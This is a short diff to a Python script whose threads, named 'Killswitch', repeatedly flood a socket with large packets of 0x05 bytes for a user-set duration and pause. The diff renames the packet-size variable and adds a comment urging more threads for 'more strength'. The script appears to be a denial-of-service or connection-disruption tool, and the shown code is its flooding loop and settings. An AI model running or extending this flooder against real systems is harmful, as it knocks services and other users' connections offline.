@@ -17,7 +17,7 @@ class Killswitch(Thread):
         while 1:
 
             if self.state == States.KILLING:
-                self.sock.send(b"\x05" * killSize)
+                self.sock.send(b"\x05" * packetSize)
 
             elif self.state == States.PAUSED:
                 sleep(0.1)
@@ -25,7 +25,7 @@ class Killswitch(Thread):
 
 def main():
     switches = []
-    for i in range(1):
+    for i in range(1):  # if u need even more strength, raise this bruh
         switches.append(Killswitch())
 
     for switch in switches:
@@ -49,5 +49,5 @@ def main():
 if __name__ == "__main__":
     pauseDelay = float(input("Pause delay in FLOAT, e.g. 1.23 (seconds to wait after every kill): "))
     killDuration = float(input("Kill duration in FLOAT, e.g. 1.23 (seconds the kill will be performed): "))
-    killSize = int(input("Kill size (bytes per packet, default 40000): "))
+    packetSize = int(input("Packet size (bytes per packet, default 40000): "))
     main()
